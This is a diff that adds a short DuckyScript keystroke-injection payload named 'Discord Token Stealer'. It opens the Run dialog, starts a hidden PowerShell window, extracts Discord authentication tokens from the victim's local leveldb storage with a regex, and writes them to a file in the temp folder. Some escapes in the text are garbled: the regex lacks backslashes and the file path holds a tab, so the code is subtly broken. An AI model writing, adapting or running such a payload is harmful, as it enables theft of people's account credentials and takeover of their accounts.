@@ -1,0 +1,5 @@
+REM Discord Token Stealer
+GUI r
+DELAY 200
+STRING powershell -W Hidden -C "(Get-Item $env:APPDATA\discord\Local Storage\leveldb\*.ldb) | Select-String [w-]{24}.[w-]{6}.[w-]{27} | %{$_.Matches.Value} | Out-File $env:TEMP	okens.txt"
+ENTER
